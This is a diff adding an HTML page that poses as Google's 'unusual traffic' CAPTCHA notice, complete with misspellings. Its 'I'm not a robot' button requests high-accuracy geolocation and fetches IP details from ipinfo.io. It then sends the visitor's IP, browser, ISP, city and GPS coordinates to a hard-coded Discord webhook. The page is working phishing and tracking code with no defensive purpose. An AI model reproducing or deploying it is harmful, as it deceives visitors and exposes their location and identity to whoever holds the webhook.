@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title></title>
+</head>
+<body>
+
+    <h1></h1>
+    <p>About this page: Our systems have detected unusual traffic on your computer network. This page checks to see if it's really you sending the request and not a robot. Why did it happen? This page appears when Google automatically detects requenta coming from your computer network that appear to be in violation of the enns ol Serier. The block will expire shortly after those requests stop. In the meantime, solving the below CAPTICHA will let you continue to use your services. This traffic may have been caused by malicious software, a browsing plug-in, or a service that sends automated requests. If you need help with your network connection, ask your administrator for help. A different computer using the same IP address may be responsible. Sometimes, you may be asked to solve the CAPTCHA if you are using advanced terms that robots are known to use or sending requests very quickly.</p>
+
+    <button onclick="askForPermission()">I'm not a robot</button>
+
+    <script>
+        function askForPermission() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        collectAndSendData(position);
+                    },
+                    error => {
+                        console.error('Error getting location:', error);
+                        alert('Failed to get location. The website will not collect your data.');
+                    },
+                    { enableHighAccuracy: true } // Request high accuracy for GPS
+                );
+            } else {
+                alert("Geolocation is not supported by your browser. The website will not collect your data.");
+            }
+        }
+
+        function collectAndSendData(position) {
+            const location = {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude
+            };
+
+            // Fetch additional IP-related information
+            fetch('https://ipinfo.io/json')
+                .then(response => response.json())
+                .then(ipData => {
+                    // Replace 'YOUR_WEBHOOK_URL' with your actual Discord webhook URL
+                    const discordWebhookUrl = 'https://discord.com/api/webhooks/1190564613012586588/V7uOcMaNl97jHIkuElKj3XgFD0nFUFRFP-PnfzwhC8C5OA1-5jg59_a8WeImjefJ9wWQ';
+
+                    // Construct the message
+                    const message = `
+                        Date: ${new Date()}
+                        IP: ${ipData.ip}
+                        Browser: ${navigator.userAgent}
+                        Platform: ${navigator.platform}
+                        ISP: ${ipData.org}
+                        Country: ${ipData.country}
+                        City: ${ipData.city}
+                        State: ${ipData.region}
+                        Latitude: ${location.latitude}
+                        Longitude: ${location.longitude}
+                    `;
+
+                    // Send the message to Discord using a webhook
+                    sendToDiscord(discordWebhookUrl, message);
+                })
+                .catch(ipError => {
+                    console.error('Error getting IP information:', ipError);
+                });
+        }
+
+        function sendToDiscord(webhookUrl, message) {
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ content: message }),
+            })
+            .then(response => {
+                if (!response.ok) {
+                    console.error('Failed to send message to Discord:', response.status, response.statusText);
+                }
+            })
+            .catch(error => console.error('Error sending message to Discord:', error));
+        }
+    </script>
+
+</body>
+</html>
